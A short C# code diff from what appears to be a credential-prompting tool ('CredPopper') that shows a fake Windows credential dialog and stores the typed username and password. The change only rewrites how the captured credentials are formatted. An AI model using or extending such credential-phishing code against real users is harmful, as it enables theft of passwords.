@@ -33,7 +33,7 @@ namespace Core.CredPopper
             var savePwd = false;
 
             PromptForCredentials(ref info, title, 0, username, out var password, ref savePwd, flags, minLengthPassword);
-            _creds = $"[+] Username: {username}\r\n[+] Password: {password}";
+            _creds = "[+] Username: " + username + "\r\n[+] Password: " + password;
         }
 
         private static void PromptForCredentials(ref Internals.CreduiInfo creditUi, string targetName, int netError, string userName, out string password, ref bool save,
